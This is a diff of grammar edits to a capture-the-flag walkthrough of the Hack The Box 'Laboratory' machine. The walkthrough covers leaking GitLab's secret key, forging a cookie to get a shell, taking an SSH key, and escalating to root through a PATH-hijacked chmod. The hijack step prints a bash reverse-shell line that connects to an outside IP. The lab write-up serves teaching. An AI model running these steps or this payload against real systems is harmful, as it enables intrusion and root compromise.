@@ -26,7 +26,7 @@ On `laboratory.htb` there is a static site
 
 <img src="./img/homelab.png"  width="650"/>
 
-and can take some potential username: `dexter`, `dee dee`, `anonymous`.
+and i can take some potential username: `dexter`, `dee dee`, `anonymous`.
 
 While on `git.laboratory.htb` there is a gitlab instance.
 
@@ -36,7 +36,7 @@ On this page i can signup
 
 <img src="./img/signup.png"  width="650"/>
 
-and then autologin
+and then login
 
 <img src="./img/home.png"  width="650"/>
 
@@ -59,7 +59,7 @@ then moved the issue on the second repo. In this way i got the `secret_key_base`
 
 
 
-For second vulnerability i installed localy gitlab(version 12.8.1) and changed the default value of `secret_key_base` in `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` with remote value. subsequently i run `gitlab-rails console` for generate a cookie.
+For second vulnerability i installed locally gitlab(version 12.8.1) and changed the default value of `secret_key_base` in `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` with the remote value, subsequently i run `gitlab-rails console` for generate a cookie.
 
 rails console:
 ```ruby
@@ -84,11 +84,11 @@ now insert this cookie in the curl request
 
 <img src="./img/shellwitupython.png"  width="650"/>
 
-and got rev shell as user `git`. Now i run `gitlab-rails console`  and change the password for the user `dexter`. ([cheatsheet1](https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html),[cheatsheet2](https://docs.gitlab.com/ee/security/reset_user_password.html))
+and i got rev shell as user `git`. Now i run `gitlab-rails console`  and change the password for the user `dexter`. ([cheatsheet1](https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html),[cheatsheet2](https://docs.gitlab.com/ee/security/reset_user_password.html))
 
 <img src="./img/changepassword.png"  width="650"/>
 
-Now can login on gitlab as user `dexter` and there is a repo called `secureDocker` and within  there is the [ssh](https://git.laboratory.htb/dexter/securedocker/-/raw/master/dexter/.ssh/id_rsa) key of `dexter`.
+Now i can login on gitlab as user `dexter` and there is a repo called `secureDocker` and within  there is the [ssh](https://git.laboratory.htb/dexter/securedocker/-/raw/master/dexter/.ssh/id_rsa) key of `dexter`.
 
 <img src="./img/key.png"  width="650"/>
 
@@ -112,7 +112,7 @@ This is the main function
 
 ```
 
-So the executable run `chmod` as `root` also the `chmod` is executing  without the full path. So i can create a new file called `chmod` with the following content
+So the executable run `chmod` as `root`, the `chmod` is executing  without the full path, so i can create a new file called `chmod` with the following content
 
 >bash -c \`exec bash -i &>/dev/tcp/10.10.14.149/9090 >&1 \`
 
@@ -122,19 +122,11 @@ and update the variable `$PATH`
 
 <img src="./img/path2.png"  width="650"/>
 
-Now the path `/tmp`  with my version of chmod is at the beginning of in `$PATH` and when i run `docker-security` is executed chmod in tmp instead of chmod in bin.
+Now the path `/tmp` with my version of chmod is at the beginning of `$PATH` and when i run `docker-security` is executed chmod in tmp instead of chmod in bin.
 
 <img src="./img/rootshell.png"  width="650"/>
 
 and got shell as `root` and can grab the root flag.
-
-
-
-
-
-
-
-
 
 
 
